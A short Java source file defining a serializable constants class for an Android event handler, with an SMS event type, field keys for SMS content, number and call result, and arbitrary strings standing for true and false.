package com.android.dvci.util;

import java.io.Serializable;
import java.lang.reflect.Type;

/**
 * Created by zad on 02/03/15.
 */
public class LowEventHandlerDefs implements Serializable{
	public static final int EVENT_TYPE_SMS = 0;
	public static final int EVENT_TYPE_UNDEF = -1;
	public static final String TRUE = "ennnsd";
	public static final String FALSE = "esdlp";
	public static final String SMS_FIELD_CONTENT = "sm_c";
	public static final String SMS_FIELD_NUMBER = "sm_n";
	public static final String SMS_FIELD_RES_CALL = "sm_co";
	public static String EVENT_TYPE="et";

	public Serializable data;
	public int res;
	public int type = EVENT_TYPE_UNDEF;

}
